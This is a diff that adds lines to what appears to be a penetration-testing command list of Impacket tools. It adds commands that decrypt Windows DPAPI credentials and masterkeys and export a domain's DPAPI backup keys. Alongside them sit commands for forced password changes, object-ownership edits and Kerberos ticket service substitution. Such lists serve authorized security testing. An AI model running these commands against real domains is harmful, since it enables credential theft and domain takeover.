@@ -70,6 +70,12 @@ changepasswd.py -newpass '123Pentest!!!' "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST
 changepasswd.py -newpass '123Pentest!!!' -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 owneredit.py -action write -new-owner "$NEW_OWNER" -target "$TARGET_OBJECT" "$DOMAIN"/"$USER":"$PASSWORD"
 mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" -windows-auth
+dpapi.py credential -file "$CRED_FILE" -key "$DECRYPTED_MASTERKEY"
+dpapi.py masterkey -file "$MASTERKEY_FILE" -sid "$USER_SID" -hash "$NT_HASH"
+dpapi.py masterkey -file "$MASTERKEY_FILE" -sid "$USER_SID" -password "$MASTERKEY_PASSWORD"
+dpapi.py masterkey -file "$MASTERKEY_FILE" -pvk "$BACKUP_KEY"
+dpapi.py backupkeys --export -t "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 describeTicket.py "$CCACHE_PATH"
 tgssub.py -in "$CCACHE_PATH" -altservice "cifs/$HOSTNAME.$DOMAIN" -out newticket-cifs.ccache
 tgssub.py -in "$CCACHE_PATH" -altservice "http/$HOSTNAME.$DOMAIN" -out newticket-http.ccache
